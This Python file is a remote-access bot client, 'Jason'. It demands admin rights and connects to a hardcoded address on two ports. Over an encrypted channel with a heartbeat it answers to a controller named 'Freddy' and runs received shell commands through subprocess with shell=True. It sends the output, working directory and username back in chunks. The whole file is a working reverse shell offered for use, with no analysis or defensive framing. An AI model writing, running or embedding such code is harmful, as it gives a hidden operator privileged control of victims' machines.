import socket
import end2end
import time
import threading
import signal
import sys
import os
import subprocess
import ctypes


def is_running_as_admin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

class Jason:
    def __init__(self):
        self.host = "192.168.0.169"
        self.port_init = 61346
        self.port_heartbeat = 61347
        self.init_sock = None
        self.heartbeat_sock = None
        self.heartbeat_sock_enc = None
        self.HARD_STOP = False
        self.shell_enc = None
        signal.signal(signal.SIGINT, self.shutdown)
        signal.signal(signal.SIGTERM, self.shutdown)

    def bot_init(self):
        while self.HARD_STOP == False:
            print(self.HARD_STOP)
            try:
                
                # Initialize main socket
                self.init_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.init_sock.connect((self.host, self.port_init))
                print("Connected To Server on INIT port")
                self.secure_sock = end2end.createComunicator(self.init_sock, 2048)
                print("Secured INIT Socket")
                self.secure_sock.send(str("!INIT!").encode())
                print("Sent Init")
                bot_data = self.secure_sock.recv().decode(errors='replace')
                if bot_data == "!KILL!":
                    print("Received KILL signal on INIT port")
                    self.HARD_STOP = True
                    self.quick_stop()
                    return

                if bot_data == "!INITIALIZED!":
                    # Initialize heartbeat socket
                    self.heartbeat_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.heartbeat_sock.connect((self.host, self.port_heartbeat))
                    print("Connected To Server on HEARTBEAT port")
                    self.heartbeat_sock_enc = end2end.createComunicator(self.heartbeat_sock, 2048)
                    print("Secured HEARTBEAT Socket")
                    
                    threading.Thread(target=self.heart_beat).start()
                    self.handle_Freddy()
            except Exception as e:
                if self.HARD_STOP:
                    break
                self.init_sock = None
                self.heartbeat_sock = None
                self.heartbeat_sock_enc = None
                self.shell_enc = None
                print(f"[+] Failed To Connect To Freddy: {e}")
                time.sleep(5)


    def heart_beat(self):
        while not self.HARD_STOP:
            try:
                msg = self.heartbeat_sock_enc.recv().decode()
                if msg == "!HEARTBEAT!":
                    self.heartbeat_sock_enc.send("!CRYSTAL-LAKE!".encode())
                elif msg == "!KILL!":
                    self.HARD_STOP = True
                    self.quick_stop()
                    break
                else:
                    self.HARD_STOP = True
                    self.quick_stop()
                    break
            except Exception as e:
                self.HARD_STOP = True
                self.quick_stop()
                break
    
    def handle_Freddy(self):
        while not self.HARD_STOP:
            try:
                c = self.init_sock.recv(1024).decode("utf-8")
            except UnicodeDecodeError:
                print("Decode error in handle_Freddy")
                continue
            print(c)
            if str(c) == "1":
                if self.shell_enc == None:
                    enc = end2end.createComunicator(self.init_sock, 2048)
                    self.shell_enc = enc
                else:
                    enc = self.shell_enc
                try:
                    msg = enc.recv().decode(errors='replace')
                except UnicodeDecodeError:
                    print("Decode error in handle_Freddy shell initialization")
                    continue
                msg = str(msg)
                if msg == "!INIT-SHELL!":
                    end = False
                    while True and end == False:
                        try:
                            command = enc.recv().decode(errors='replace')
                        except UnicodeDecodeError:
                            print("Decode error in handle_Freddy shell command")
                            continue
                        print(command)
                        if command == "!PWD-SHELL!":
                            if os.name == 'nt':  # Windows
                                enc.send(str(os.getenv('USERNAME')).encode())
                            else:  # Linux, Unix, macOS
                                enc.send(str(os.getenv('USER')).encode()) 
                            time.sleep(0.0001)
                            enc.send(str(os.getcwd()).encode())
                        elif command == "!EXIT-SHELL!":
                            end = True
                            enc = None
                            break
                        elif "cd " in str(command):
                            worked = False
                            try:
                                directory = str(command).replace("cd ", "")
                                os.chdir(str(directory))
                                worked = True
                            except:
                                worked = False
                            if worked:
                                enc.send(str(os.getcwd()).encode())
                            else:
                                enc.send("Error! Directory Not Found".encode())
                        else:
                            try:
                                proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                                proc_result = str(proc.stdout.read().decode() + proc.stderr.read().decode())
                                if len(proc_result) <= 2047:
                                    enc.send(proc_result.encode())
                                else:
                                    sections = []
                                    enc.send("!PACKET-SENDER!".encode())
                                    confirm = enc.recv().decode()
                                    if confirm == "!PACKET-SENDER-CONFIRM!":
                                        for i in range(0, len(proc_result), 90):
                                            sections.append(proc_result[i:i+90])
                                        enc.send(str(len(sections)).encode())
                                        for i in range(0, (len(sections))):
                                            enc.send(str(sections[i]).encode())
                                            print("packet sent " + str(i))
                                            time.sleep(0.01)
                            except:
                                enc.send("Error Running Command".encode())
        return

    def shutdown(self, signum, frame):
        print("Shutting down client...")
        if self.init_sock:
            self.init_sock.close()
        if self.heartbeat_sock:
            self.heartbeat_sock.close()
        sys.exit(0)
    
    def quick_stop(self):
        print("Shutting down client...")
        if self.init_sock:
            self.init_sock.close()
        if self.heartbeat_sock:
            self.heartbeat_sock.close()
        sys.exit(0)

if __name__ == "__main__":
    # Check if admin
    if is_running_as_admin():
        killer = Jason()
        killer.bot_init()
    else:
        print("Cant Run As Default User. Please Run As Admin!")
